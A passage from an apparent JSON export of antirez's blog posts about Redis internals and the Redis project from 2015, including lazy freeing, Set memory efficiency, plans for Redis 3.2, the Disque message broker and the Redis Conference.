sensitive lines changed in the course of multiple weeks. But now all tests are passing. 3. Rewrite lazyfree to be threaded.  The result is that Redis is now more memory efficient since there are no robj structures around in the implementation of the data structures (but they are used in the code paths where there is a lot of sharing going on, for example during the command dispatch and replication). Threaded lazy free works great and is faster than the incremental one to reclaim memory, even if the implementation of the incremental one is something I like a lot and was not so terrible even compared with the threaded one. But now, you can delete a huge key and the performance drop is negligible which is very useful. But, the most interesting thing is, Redis is now faster in all the operations I tested so far. Less indirection was a real winner here. It is faster even in unrelated benchmarks just because the client output buffers are now simpler and faster. In the end I deleted the incremental lazy freeing implementation from the branch, to retain only the threaded one.  A note about the API \u2014  However what about the API? We still have a blocking DEL, the default is the same, since DEL in Redis means: reclaim memory now. I didn\u2019t like the idea of changing that. So now you have a new command called UNLINK which more clearly states what is happening to the value.  UNLINK is a smart command: it calculates the deallocation cost of an object, and if it is very small it will just do what DEL is supposed to do and free the object ASAP. Otherwise the object is sent to the background queue for processing. Otherwise the two commands are identical from the point of view of the keys space semantics.  FLUSHALL / FLUSHDB non blocking variants were also implemented, but still not at API level, they\u2019ll just take a LAZY option that if given will change the behavior.  Not just lazy freeing \u2014  Now that values of aggregated data types are fully unshared, and client output buffers don\u2019t contain shared objects as well, there is a lot to exploit. For example it is finally possible to implement threaded I/O in Redis, so that different clients are served by different threads. This means that we\u2019ll have a global lock only when accessing the database, but the clients read/write syscalls and even the parsing of the command the client is sending, can happen in different threads. This is a design similar to memcached, and one I look forward to implement and test.  Moreover it is now possible to implement certain slow operations on aggregated data types in another thread, in a way that only a few keys are \u201cblocked\u201d but all the other clients can continue. This can be achieved in a very similar way to what we do currently with blocking operations (see blocking.c), plus an hash table to store what keys are currently busy and with what client. So if a client asks for something like SMEMBERS it is possible to lock just the key, process the request creating the output buffer, and later release the key again. Only clients trying to access the same key will be blocked if the key is blocked.  All this requires even more drastic internal changes, but the bottom line here is, we have a taboo less. We can compensate object copying times with less cache misses and a smaller memory footprint for aggregated data types, so we are now free to think in terms of a threaded Redis with a share-nothing design, which is the only design that could easily outperform our single threaded one. In the past a threaded Redis was always seen as a bad idea if thought as a set of mutexes in data structures and objects in order to implement concurrent access, but fortunately there are alternatives to get the best of both the worlds. And we have the option to still serve all the fast operations like we did in the past from the main thread, if we want. There should be only to gain performance-wise, at the cost of some contained complexity.  ETA \u2014  I touched a lot of internals, this is not something which is going live tomorrow. So my plan is to call 3.2. what we have already into unstable, do the work to put it into Release Candidate state, and merge this branch into unstable targeting 3.4.  However before merging, a very scrupulous check for speed regression should be performed. There is definitely more work to do.  If you want to give it a try check the \u201clazyfree\u201d branch on Github. Btw be aware that currently I\u2019m working at it very actively so certain things may be at moments totally broken. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-09-26T07:56:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6871.9941189, "slug": "lazy-redis-is-better-redis-47", "topics": []}}, {"model": "app.post", "pk": 48, "fields": {"title": "About Redis Sets memory efficiency", "link": "http://antirez.com/news/92", "source": 1, "normalized_link": "antirez.com/news/92", "summary": "Yesterday Amplitude published an article about scaling analytics, in the context of using the Set data type. The blog post is here: https://amplitude.com/blog/2015/08/25/scaling-analytics-at-amplitude/  On Hacker News people asked why not using Redis instead: https://news.ycombinator.com/item?id=10118413   Amplitude developers have their set of reasons for not using Redis, and in general if you have a very specific problem and want to scale it in the best possible way, it makes sense to implement your vertical solution. I\u2019m not adverse to reinventing the wheel, you want your very specific wheel sometimes, that a general purpose system may not be able to provide. Moreover creating your solution gives you control on what you did, boosts your creativity and your confidence in what you, as a developer can do, makes you able to debug whatever bug may arise in the future without external help.  On the other hand of course creating system software from scratch is a very complex matter, requires constant developments if there is a wish to actively develop something, or means to have a stalled, non evolving piece of code if there is no team dedicated to it. If it is very vertical and specialized, likely the new system is capable of handling only a slice of the whole application problems, and yet you have to manage it as an additional component. Moreover if it was created by mostly one or a few programmers that later go away from the company, then fixing and evolving it is a very big problem: there isn\u2019t sizable external community, nor there are the original developers.  Basically writing things in house is not good or bad per se, it depends. Of course it is a matter of sensibility to understand when it\u2019s worth to implement something from scratch and when it is not. Good developers know.  From my point of view, regardless of what the Amplitude developers final solution was, it is interesting to read the process and why they are not using Redis. One of the concerns they raised is the overhead of the Set data type in Redis. I believe they are right to have such a concern, Redis Sets could be a lot more memory efficient, and weeks before reading the Amplitude article, I already started to explore ways to improve Sets memory efficiency. Today I want to share the plans with you.  Dual representation of data types ===  In principle there where plain data structures, implemented more or less like an algorithm text book suggests: each node of the data structure is implemented dynamically allocating it. Allocation overhead, fat pointers, poor cache locality, are the big limits of this basic solution.  Pieter Noordhuis and I later implemented specialized implementations of Redis abstract data types, to be very memory efficient, using single allocations to hold tens or a few hundreds of elements in a single allocation, sometimes with ad-hoc encodings to better use the space. Those versions of the data structures have O(N) time complexity for certain operations, or sometimes are limited to elements having a specific format (numbers) or sizes.  So for example when you create an Hash, it starts represented in a memory efficient way which is good for a small number of elements. Later it gets converted to a real hash table if the number of elements reach a given threshold. This means that the memory efficiency of a Redis data type depends a lot on the number of elements it stores.  The next step: Redis lists ===  At some point Twitter developers realized that there was no reason to go from an array of elements in a single allocation, representing items in a List, to an actual linked list which is a lot less memory efficient. There is something in the middle: a linked list of arrays representing a few items. Their implementation does not handle defragmentation when you remove something in the middle. Pieter and I in the past tried to understand if this was worth or not, but we had some feeling the defragmentation effort may not be compensated by the space savings, and a non defragmenting implementation of this idea was too fragile as a general purpose implementation of Redis lists: remove a few elements in the middle and your memory usage changes dramatically.  Fortunately Matt Stancliff implemented the idea, including the defragmentation part, in an excellent way, and after some experimentation he showed that the new implementation was at least as good as the current implementation in Redis from the POV of performances, and much better from the point of view of memory usage. Moreover the memory efficiency of lists was no longer a function of the size of the list, and there was a single representation to deal with.  Lists are kinda special since, to have linked lists of small arrays is really an optimal representation that may not map easily to other data types. It is possible to do something like that for Sets and other data types?  Redis Sets ===  Sets memory usage is a bit special. They don\u2019t have a specialized representation like all the other Redis data structures for sets composed of strings. So even a very small Set is going to consume a lot of memory. The special representation actually exists and is excellent but only works if the Set is composed of just numbers and is small: in such a case, we represent the Set with a special encoding called \u201cintset\u201d. It is an ordered linear array of integers, so that we can use binary search for testing existence of members. The array automatically changes size of each element depending on the greatest element in the set, so representing a set that has the strings 1, 20, 30, 15 is going to take just one byte per element plus some overhead, because the strings can be represented as numbers, and are inside the 8 bits range. However just add \u201ca\u201d to the set, and it will be converted into a full hash table:  127.0.0.1:6379> sadd myset 1 2 3 4 5 (integer) 5 127.0.0.1:6379> object encoding myset \"intset\" 127.0.0.1:6379> sadd myset a (integer) 1 127.0.0.1:6379> object encoding myset \"hashtable\"  Sets of integer are a very used data type in Redis, so it is actually very useful to have that. But why we don\u2019t have a special representation for small sets composed of non numerical strings, like we have for everything else? Well, the idea was that to have a data type with *three* representations was not going to be a good thing from the point of view of Redis internals. If you check t_zset.c o t_set.c you\u2019ll see it require some care to deal with multiple representations. The more you want to abstract away dealing with N representations, the more you no longer have access to certain optimizations. Moreover the List story showed that it was possible to have a single representation with all the benefits. What you lose in terms of scanning the small aggregates containing N elements, you win back because of better cache locality, so it is possible to experiment with things that look like a tragic time/space tradeoff, but in reality are not.  Specializing Redis hash tables ===  Big hashes, non numerical (or big) sets, and big sorted sets, are currently represented by hash tables. The implementation is the one inside the dict.c file. It is an hash table implemented in a pretty trivial way, using chaining to resolve collisions. The special things in this hash table implementation are just two: it never blocks in order to rehash, the rehashing process is handled incrementally. I did this in the first months of my VMware sponsorship, and it was a big win in terms of latency, of course. dict.c also implements a special primitive called \u201cscanning\u201d invented by Pieter Noordhuis, which is a cursor based iterator without overheads nor state, but with reasonable guarantees. Apart from that the Redis hash table expects keys and values to be pointers to something, and methods in order to compare and release keys, and to release values.  This is how you want to design a general purpose hash table: pointers and methods (function pointers) to deal with values everywhere. However Redis data structures have an interesting property: every element in complex data structures are always, semantically strings. Hashes are maps between a string field and a string value. Sets are unordered sets of strings, and so forth.  What happens if we implement an hash table which is designed in order to store just string keys and string values? Well\u2026 it looks like there is a simple way to make such an hash table very memory efficient. We could set the load factor to something greater than 1, for example 10, and if there are 5 buckets in the hash table, each bucket will contain on average 10 elements.  So each bucket will be something like a linear array of key-value items, with prefixed lengths, in a very similar fashion to the encodings we use for small data types currently. Something like:  0: <3>foo<3>bar<5>hello<6>world!<0> 1: <8>user:103<3>811 \u2026 <0> 2: \u2026 <0>  And so forth. The encoding could be specialized or just something existing like MessagePack. So here the extra work you do in each bucket is hopefully compensated by the better locality you get.  To implement scanning and incremental rehashing on top of this data structure is viable as well, I did an initial analysis and while it is not possible to just copy the implementation in dict.c it is possible to find other ways to obtain the same effects.  Note that, technically speaking, it is possible to store pointers in such an hash table: they will be just strings from the point of view of the hash table implementation, and it is possible to signal, in the hash table type, that those are pointers that need special care (for example free-value function pointers or alike). However only testing can say if it\u2019s worth it or not.  However there are problems that must be solved in order to use this for more than sets, or at least in order to use *only* such a representation, killing the small representations we have currently. For example, the current small representations have a very interesting property: they are already a serialization of themselves, without extra work required: we use this to store data into RDB files, to transfer data between nodes in Redis Cluster, and so forth. The specialized hash table should have the same property hopefully, or at least each single bucket should be already in a serialized format without any post-processing work required. If this is not the case, we could use this new dictionaries only in place of the general hash tables after the expansion, which is already a big win.  Conclusions ===  This is an initial idea that requires some time for the design to be improved, validated by an implementation later, and in-depth load tested to guarantee there is no huge regression in certain legitimate workloads. If everything goes well we may end with a Redis server which is a lot more memory efficient than in the past. Such an hash table may also be used in order to store the main Redis dictionary in order to make each key overhead much smaller. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-08-28T09:40:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6816.4527856, "slug": "about-redis-sets-memory-efficiency-48", "topics": []}}, {"model": "app.post", "pk": 49, "fields": {"title": "Thanks Pivotal, Hello Redis Labs", "link": "http://antirez.com/news/91", "source": 1, "normalized_link": "antirez.com/news/91", "summary": "I consider myself very lucky for contributing to the open source. For me OSS software is not just a license: it means transparency in the development process, choices that are only taken in order to improve software from the point of view of the users, documentation that attempts to cover everything, and simple, understandable systems. The Redis community had the privilege of finding in Pivotal, and VMware before, a company that thinks at open source in the same way as we, the community of developers, think of it.  Thanks to the Pivotal sponsorship Redis was able to grow, to reach in the latest years a diffusion which I never expected it to reach. However for the final user it always was just a \"pure\"\u009d OSS project: go to the community web site, grab a tar ball, read the free documentation, send a pull request, and watch the stream of commits as they happen live.  In order to not stop this magic from happening, and in order to have enough free time to spend with my family, during these years I made the decision of not starting a Redis company. However I encouraged the creation of an economic ecosystem around Redis. There are multiple companies about Redis doing well at this point. There is one, Redis Labs, that made a remarkable steady work over the years in order to build a very strong company, with a team of developers hacking on the core of Redis, and a great set of products that provide Redis users with the commercial choices they need.  At some point it started to look like a good idea for me to move to Redis Labs. Running a big cluster of Redis instances and having a set of developers on the Redis core is the key asset for Redis future. We can work together in order to improve Redis faster, with a constant feedback on what happens into the wild of actual users running Redis and the efforts required in order to operate it at scale.  Redis Labs was willing to continue what VMware and Pivotal started. I'll be able to work as I do currently, spending all my time in the open source side of the project, while Redis Labs continues to provide Redis users with an hassles-free Redis experience of managed instances and products. However because of my close interaction with Redis Labs I believe we'll see much more contributions from Redis Labs developers to the Redis core. Things like the memory reduction pull requests which are going to be part of Redis 3.2, or the improvements to the key eviction process they contributed for Redis 3.0, are a clear example of what happens when you have great developers working at Redis, able to observe a large set of use cases.  I, Pivotal, and Redis Labs, all agree that this is important for the future of Redis, so I'm officially moving to Redis Labs starting from tomorrow morning. Thank you Pivotal and Redis Labs, we'll have to ship more OSS code in the next years, and this is just great.  EDIT: Redis Labs press release can be found here: https://redislabs.com/press-releases/redis-creator-salvatore-sanfilippo-antirez-joins-redis-labs Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-07-15T11:46:47Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6732.1411189, "slug": "thanks-pivotal-hello-redis-labs-49", "topics": []}}, {"model": "app.post", "pk": 50, "fields": {"title": "Commit messages are not titles", "link": "http://antirez.com/news/90", "source": 1, "normalized_link": "antirez.com/news/90", "summary": "Nor subjects, for what matters. Everybody will tell you to don't add a dot at the end of the first line of a commit message. I followed the advice for some time, but I'll stop today, because I don't believe commit messages are titles or subjects. They are synopsis of the meaning of the change operated by the commit, so they are small sentences. The sentence can be later augmented with more details in the next lines of the commit message, however many times there is *no* body, there is just the first line. How many emails or articles you see with just the subject or the title? Very little, I guess. So for me it is like:  This is a smart synopsis, as information dense as possible.  And when needed, this is the long version since: 1. I did this. 2. And resulted into this. 3. And you could reproduce this way.  So every time I'll be told again to don't put a dot at the end, I'll link to this article.  But no, it's not just a matter of a dot. If the first line of a commit message is a title, it changes *the way* you write it. It becomes just some text to introduce some more text, without any stress on the information density. Coders gotta code, so if something can be told in a very short way in one line, do it, and reserve the other additional informations for the next line, without sacrificing the first line since \"It's a title\".  Moreover, programming is the art of writing synopsis, otherwise you end with programs much more complex they should be. So perhaps it's also a good exercise for us. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-06-23T08:55:22Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6689.6725633, "slug": "commit-messages-are-not-titles-50", "topics": []}}, {"model": "app.post", "pk": 51, "fields": {"title": "Plans for Redis 3.2", "link": "http://antirez.com/news/89", "source": 1, "normalized_link": "antirez.com/news/89", "summary": "I\u2019m back from Paris, DotScale 2015 was a very interesting conference. Before leaving I was working on Sentinel in the context of the unstable branch: the work was mainly about connection sharing. In short, it is the ability of a few Sentinels to scale, monitoring many masters. Before to leave, and now that I\u2019m back, I tried to \u201csecure\u201d a set of features that will be the basis for Redis 3.2. In the next weeks I\u2019ll be focusing developing these features, so I thought it\u2019s worth to share the list with you ASAP.  Geo hashing API: This work originated from Ardb, that was originally a fork of Redis (https://github.com/yinqiwen/ardb), and was later extracted and improved by Matt Stancliff (https://matt.sh/redis-geo) that ported it to Redis. Open source is cool eh? The code needs a refactoring effort since currently duplicates parts of the sorted set implementation. It is not impossible that I may also change a few things about the API, I\u2019m currently not sure, if there is something to fix, I\u2019ll fix it. But the bottom line is: this is a great feature, now that Matt is no longer contributing to Redis, there is a huge risk to lose this work, so I\u2019m going to do the effort of refactoring, reviewing and merging it as the first of the tasks for Redis 3.2. I think it is a very exciting addition to the Redis API.  Bloom filters: We\u2019ll get bloom filters in 3.2. I\u2019m not sure if this will be implemented as a String type feature like HyperLogLog are, but more likely as a new special type, since I'm interested in non trivial semantics that are more easy to provide as a new type. I\u2019ve many design ideas for bloom filters, but I\u2019m pretty sure I would like to have the ability to control from the API the accuracy/space tradeoff, perhaps not in the lower level from of specifying number of bits and hash functions to use, but in a more higher level way. Another thing I would love to have in this API is the ability of the bloom filter to auto-depollute itself (using multiple rotating filters or something like that). I\u2019ll read all the available literature and decide what to do, but we\u2019ll get this feature into 3.2.  Memory PRs: there are two important PRs from RedisLabs to improve Redis memory usage. We\u2019ll get both merged.  Memory introspection command: A command that provides information about memory, like the LATENCY command but for memory usage. Hints about where is memory consumed, if its just the RSS that is high because of past peak memory usage, hints about amount of memory used by client output buffers, ability to resize the hash tables to save some memory if needed, and so forth.  Some Redis Cluster multi DC support. This will probably just be a \u201cstatic\u201d option of Cluster slaves so that they\u2019ll not take part to promotion when the master fails. In this way using CLUSTER FAILOVER TAKEOVER it will be possible to promote all the slaves in a minority partition.  New List type operations: A few O(1) list operations like LMERGE, and O(N) operations that will be normally used with N very small so that they are most of the times O(1) operations, like operations to move N elements from a list to another.  AOF safety feature: https://github.com/antirez/redis/pull/2574  AOF rewrites optionally using an RDB preamble, so that rewriting the AOF and reloading back the content at startup is faster.  SPOP COUNT option (already implemented, 3.2 will be the first stable versions to get it))  Redis Cluster redis-trib rebalance command, in order to automatically rehash keys to end with an more homogeneous memory usage between nodes.  A few things originally planned for 3.2 were ported to 3.0 since they were safe. A recent example is ZADD with support for options like NX and XX. In general it is possible that a few more commands about existing types will be added to Redis 3.2. This is basically a Redis version which is designed to make happy people that wanted more in the API side, since for a while we focused more on the operations aspect of Redis.  About the ETA, the work is starting Monday, and I hope they\u2019ll not take more time than the end of September, when the first RC will be pushed. Once it is RC, the RC -> Stable transition time is not scheduled, it is a function of the reporting time of critical bugs. Once for a few weeks nobody notices more bad issues, we\u2019ll go stable.  I\u2019ll follow up with new blog posts about single entries listed above, like for the Geo hashing thing, the bloom filter final implementation and API description, and so forth.  In the meantime, have fun with Redis 3.0! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-06-12T13:53:53Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6668.9505856, "slug": "plans-for-redis-32-51", "topics": []}}, {"model": "app.post", "pk": 52, "fields": {"title": "Adventures in message queues", "link": "http://antirez.com/news/88", "source": 1, "normalized_link": "antirez.com/news/88", "summary": "EDIT: In case you missed it, Disque source code is now available at http://github.com/antirez/disque  It is a few months that I spend ~ 15-20% of my time, mostly hours stolen to nights and weekends, working to a new system. It\u2019s a message broker and it\u2019s called Disque. I\u2019ve an implementation of 80% of what was in the original specification, but still I don\u2019t feel like it\u2019s ready to be released. Since I can\u2019t ship, I\u2019ll at least blog\u2026 so that\u2019s the story of how it started and a few details about what it is.  ~ First steps ~  Many developers use Redis as a message queue, often wrappered via some library abstracting away Redis low level primitives, other times directly building a simple, ad-hoc queue, using the Redis raw API. This use case is covered mainly using blocking list operations, and list push operations. Redis apparently is at the same time the best and the worst system to use like that. It\u2019s good because it is fast, easy to inspect, deploy and use, and in many environments it was already one piece of the infrastructure. However it has disadvantages because Redis mutable data structures are very different than immutable messages. Redis HA / Cluster tradeoffs are totally biased towards large mutable values, but the same tradeoffs are not the best ones to deal with messages.  One thing that is important to guarantee for a message broker is that a message is delivered either at least one time, or at most one time. In short given that to guarantee an exact single delivery of a message (where for delivery we intent a message that was received *and* processed by a worker) is practically impossible, the choices are that the message broker is able to guarantee either 0 or 1 deliveries, or 1 to infinite deliveries. This is often referred as at-most-once semantics, and at-least-once semantics. There are use cases for the first, but the most interesting and practical semantics is the latter, that is, to guarantee that a message is delivered at least one time, and deliver multiple times if there are failures.  So a few months ago I started to think at some client-side protocol to use a set of Redis masters (without replication or clustering whatsoever) in a way that provides these guarantees. Sometimes with small changes in the way Redis is used for an use case, it is possible to end with a better system. For example for distributed locks I tried to document an algorithm which is trivial to implement but more robust than the single-instance + failover implementation (http://redis.io/topics/distlock).  However after a few days of work my design draft suggested that it was a better bet to design an ad-hoc system, since the client-side algorithm ended being too complex, non optimal, and certain things I absolutely wanted were impossible or very hard to do. To add more things to Redis sounded like a bad idea, it does a lot of things already, and to cover messaging well I needed things which are very different than the way Redis operates. But why to design a new system given that the world is full of message brokers? Because an impressive number of users were using Redis instead of systems specifically designed for this goal, and this was strange. A few can be wrong, but so many need to get some reason. Maybe Redis low barrier of entry, easy API, speed, were not what most people were accustomed to when they looked at the message brokers landscape. It seems populated by solutions that are either too simple, asking the application to do too much, or too complex, but super full featured. Maybe there is some space for the \u201cRedis of messaging\u201d?  ~ Redis brutally forked ~  For the first time in my life I didn\u2019t started straight away to write code. For weeks I looked at the design from time to time, converted it into a new system and not a Redis client library, and tried to understand, as an user, what would make me very happy in a message broker. The original use case remained the same: delayed jobs. Disque is a general system, but 90% of times in the design the \u201creference\u201d was an user that has to solve the problem of sending messages that are likely jobs to process. If something was against this use case, it was removed.  When the design was ready, I finally started to code. But where to start? \u201cvi main.c\u201d? Fortunately Redis is, in part, a framework to write distributed systems in C. I had a protocol, network libraries, clients handling, node-to-node message bus. To rewrite all this from scratch sounded like a huge waste. At the same time I wanted Disque to be able to completely diverge from Redis in any details possible if this is needed, and I wanted it to be a side project without impacts on Redis itself. So instead of trying the huge undertake of splitting Redis into an actual separated framework, and the Redis implementation, I took a more pragmatic approach: I forked the code, and removed everything that was Redis specific from the source code, in order to end with a skeleton. At this point I was ready to implement my specification.  ~ What is Disque? ~  After a few months of very non intense work and just 200 commits I\u2019ve finally a system that no longer looks like a toy: it looked like a toy for many weeks so I was afraid of even talking about it, since the probability of me just deleting the source tree was big. Now that most of the idea is working code with tests, I\u2019m finally sure this will be released in the future, and to talk about the tradeoffs I took in the design.  Disque is a distributed system, by default. Since it is an AP system, it made no sense to have like in Redis a single-node mode and a distributed mode. A single Disque node is just a particular case of a cluster, having just one node. So this was of the important points in the design: fault tolerant, resistant to partitions, and available no matter how many nodes are still up, aka AP. I also wanted a system that was inherently able to scale in different scenarios, both when the issue is many producers and consumers with many queues, and when instead all this producers and consumers are all focusing on a single queue, that may be distributed into multiple nodes.  My requirements were telling me aloud one thing\u2026 that Disque was going to make a big design sacrifice. Message ordering. Disque only provides best-effort ordering. However because of this sacrifice, there is a lot to gain\u2026 tradeoffs are interesting since sometimes they totally open the design space.  I could continue recounting you what Disque is like that, however a few months ago I saw a comment in Hacker News, written by Jacques Chester, see https://news.ycombinator.com/item?id=8709146 [EDIT: SORRY I made an error cut&pasting the wrong name of Adrian (Hi Adrian, sorry for misquoting you!)]. Jacques, that happens to work for Pivotal like me, was commenting how different messaging systems have very different set of features, properties, and without the details it is almost impossible to evaluate the different choices, and to evaluate if one is faster than the other because it has a better implementation, or simple offers a lot less guarantees. So he wrote a set of questions one should ask when evaluating a messaging system. I\u2019ll use his questions, and add a few more, in order to describe what Disque is, in the hope that I don\u2019t end just hand waving, but providing some actual information.  Q: Are messages delivered at least once?  In Disque you can chose at least once delivery (the default), or at most once delivery. This property can be set per message. At most once delivery is just a special case of at least once delivery, setting the \u201cretry\u201d parameter of the message to 0, and replicating the message to a single node.  Q: Are messages acknowledged by consumers?  Yes, the only way for a consumer to tell the system the message got delivered correctly, is to acknowledge it.  Q: Are messages delivered multiple times if not acknowledged?  Yes, Disque will automatically deliver the message again, after a \u201cretry\u201d time, forever (up to the max TTL time for the message). When messages are acknowledged, the acknowledge is propagated to the nodes having a copy of the message. If the system believes everybody was reached, the message is finally garbage collected and removed. Acknowledged messages are also evicted during memory pressure.  Nodes run a best-effort algorithm to avoid to queue the same message multiple times, in order to approximate single delivery better. However during failures, multiple nodes may re-deliver the same message multiple times at the same time.  Q: Is queueing durable or ephemeral.  Durable.  Q: Is durability achieved by writing every message to disk first, or by replicating messages across servers?  By default Disque runs in-memory only, and uses synchronous replication to achieve durability (however you can ask, per message, to use asynchronous replication). It is possible to turn AOF (similarly to Redis) if desired, if the setup is likely to see a mass-reboot or alike. When the system is upgraded it is possible to write the AOF on disk just for the upgrade in order to don\u2019t lose the state after a restart even if normally disk persistence is not used.  Q: Is queueing partially/totally consistent across a group of servers or divided up for maximal throughput?  Divided up for throughput, however message ordering is preserved in a best-effort way. Each message has an immutable \u201cctime\u201d which is a wall-clock milliseconds timestamp plus an incremental ID for messages generated in the same millisecond. Nodes use this ctime in order to sort messages for delivery.  Q: Can messages be dropped entirely under pressure? (aka best effort)  No, however new messages may be refused if there is no space in memory. When 75% of memory is in use, nodes receiving messages try to externally replicate them, just to outer nodes, without taking a copy, but it many not work if also the other nodes are in an out of memory condition.  Q: Can consumers and producers look into the queue, or is it totally opaque?  There are commands to \u201cPEEK\u201d into queues.  Q: Is queueing unordered, FIFO or prioritised?  Best-effort FIFO-ish as explained.  Q: Is there a broker or no broker?  Broker as a set of masters. Clients can talk to whatever node they want.  Q: Does the broker own independent, named queues (topics, routes etc) or do producers and consumers need to coordinate their connections?  Named queues. Producers and consumers does not need to coordinate, since nodes use federation to discover routes inside the cluster and pass messages as they are needed by consumers. However the client is provided with hints in case it is willing to relocate where more consumers are.  Q: Is message posting transactional?  Yes, once the command to add a message returns, the system guarantees that there are the desired number of copies inside the cluster.  Q: Is message receiving transactional?  I guess not, since Disque will try to deliver the same message again if not acknowledged.  Q: Do consumers block on receive or can they check for new messages?  Both behaviors are supported, by default it blocks.  Q: Do producers block on send or can they check for queue fullness?   The producer may ask to get an error when adding a new message if the message length is already greater than a specified value in the local node it is pushing the message.  Moreover the producer may ask to replicate the message asynchronously if it want to run away ASAP and let the cluster replicate the message in a best-effort way.  There is no way to block the consumer if there are too many messages in the queue, and unblock it as soon as there are less messages.  Q: Are delayed jobs supported?  Yes, with second granularity, up to years. However they\u2019ll use memory.  Q: Can consumers and producers connect to different nodes?  Yes.  I hope with this post Disque is a bit less vaporware. Sure, without looking at the code it is hard to tell, but if your best feature is out you can already complain at least. How much of the above is already implemented and working well? Everything but AOF disk persistence, and a few minor things I want to refine in the API, so first release should not be too far, but working at it so rarely it is hard to get super fast. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-03-15T22:32:15Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6498.7617411, "slug": "adventures-in-message-queues-52", "topics": []}}, {"model": "app.post", "pk": 53, "fields": {"title": "Redis Conference 2015", "link": "http://antirez.com/news/87", "source": 1, "normalized_link": "antirez.com/news/87", "summary": "I\u2019m back home, after a non easy trip, since to travel from San Francisco to Sicily is kinda NP complete: there are no solutions involving less than three flights. However it was definitely worth it, because the Redis Conference 2015 was very good, SF was wonderful as usually and I was able to meet with many interesting people. Here I\u2019ll limit myself to writing a short account of the conference, but the trip was also an incredible experience because I discovered old and new friends, that are not just smart programmers, but also people I could imagine being my friends here in Sicily. I never felt alone while I was 10k kilometers away from my home.  The conference was organized by RackSpace in a magistral way, with RedisLabs, Heroku, and Hulu, sponsoring it as well. I can\u2019t say thank you enough times to everybody. Many people traveled from different parts of US and outside US to SF just for a couple of days, the venue was incredibly cool, and everything organized in the finest details.  There was even an incredible cake for the Redis 6th birthday :-)  However the killer features of the conference were, the number and the quality of the attenders (mostly actual Redis users), around 250 people, and the quality of the talks. The conference was free, even if it did not looked like a free conference at all, at any level. An incredible stage where to talk, very high quality food, plenty of space. All this honestly helped to create a setup for interesting exchanges. Everybody was using Redis for something, to get actual things done, and a lot of people shared their experiences. Among the talks I found Hulu and Heroku ones extremely interesting, because they covered details about different use cases and operational challenges. I also happen to agree with Bill Andersen (from RackSpace) vision on benchmarking Redis in a use-case oriented fashion, even if I missed the initial part of his talk because I was being interviewed, but the cool thing is, there will be recordings of the talks, so it will be possible for everybody to watch them when available at the conf site, which is, http://redisconference.com  I was approached by several VeryLargeCompanies recounting stories of how they are using or are going to use Redis to do VeryLargeUseCase. Basically at this point Redis is everywhere.  Redis Conference was a big gift to the Redis community\u2026 and in some way it shows very well how much there is a Redis outside Redis, I mean, at this point it has a life outside the borders of the server and client libraries repositories. It is a technology with many users that exchange ideas and that work with it in different ways: internally to companies to provide it as a technology to cover a number of use cases, and also in the context of cloud providers, that are providing it as a service to other companies.  One thing I did not liked was Matt Stancliff talk. He tried to uncover different problems in the Redis development process, and finally proposed the community to replace me as the project leader, with him. In my opinion what Matt actually managed to do was to cherry-pick from my IRC, Twitter and Github issues posts in a very unfair way, in order to provide a bad imagine of myself. I think this was a big mistake. Moreover he did the talk as the last talk, not providing a right to reply. Matt and I happen to be persons with very different visions in many ways, however Redis is a project I invested many years into, and I\u2019m not going to change my vision, I\u2019m actually afraid I merged some code under pressure that I now find non well written and designed.  What prevents Redis for becoming a monoculture is its license, if the community at some point really believes it is possible to do much better, or simply to do things in a very different way, some forks will appear, and darwinian selection will work to make sure we have the best Redis possible. Technical leadership is a reward for the work you are capable to do, is not asked at conferences. Moreover technology is not just code, is also about human interactions, and life is too short to interact with people we don\u2019t share the same fundamental values of what a good behavior is.  Well, even if this left some bitter taste, overall the Redis Conference was a magical experience, and even Matt talk actually helped me to understand what to do in the future and what I want for this project. Thank you to who made it possible and to all the attenders, I hope to see you again next year. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2015-03-10T09:22:20Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6488.1085189, "slug": "redis-conference-2015-53", "topics": []}}, {"model": "app.post", "pk": 54, "fields": {"title": "Side projects", "link": "http://antirez.com/news/86", "source": 1, "normalized_link": "antirez.com/news/86", "summary": "Today Redis is six years old. This is an incredible accomplishment for me, because in the past I switched to the next thing much faster. There are things that lasted six years in my past, but not like Redis, where after so much time, I still focus most of my everyday energies into.  How did I stopped doing new things to focus into an unique effort, drastically monopolizing my professional life? It was a too big sacrifice to do, for an human being with a limited life span. Fortunately I simply never did this, I never stopped doing new things.  If I look back at those 6 years, it was an endless stream of side projects, sometimes related to Redis, sometimes not.  1) Load81, children programming environment. 2) Dump1090, software defined radio ADS-B decoder. 3) A Javascript ray tracer. 4) lua-cmsgpack, C implementation of msgpack for Lua. 5) linenoise line editing library. Used in Redis, but well, was not our top priority. 6) lamernews, Redis-based HN clone. 7) Gitan, a small Git web interface. 8) shapeme, images evolver using simulated annealing. 9) Disque, a distributed queue (work in progress right now).  And there are much more throw-away projects not listed here. The interesting thing is that many of the projects listed above are not random hacking efforts that had as an unique goal to make me happy. A few found their way into other people\u2019s code.  Because of the side projects, I was able to do different things when I was stressed and impoverished from doing again and again the same thing. I could later refocus on Redis, and find again the right motivations to have fun with it, because small projects are cool, but to work for years at a single project can provide more value for others in the long run.  So currently I\u2019m using something like 20% of my time to hack on Disque, a distributed message queue. So only 80% is left for Redis development, right? Wrong. The deal is between 80% of focus on Redis and 20% on something else, or 0% of focus on Redis in the long term, because in order to have a long term engagement, you need a long term alternative to explore new things.  Side projects are the projects making your bigger projects possible. Moreover they are often the start of new interesting projects. Redis itself was a side project of LLOOGG. Sometimes you stop working at 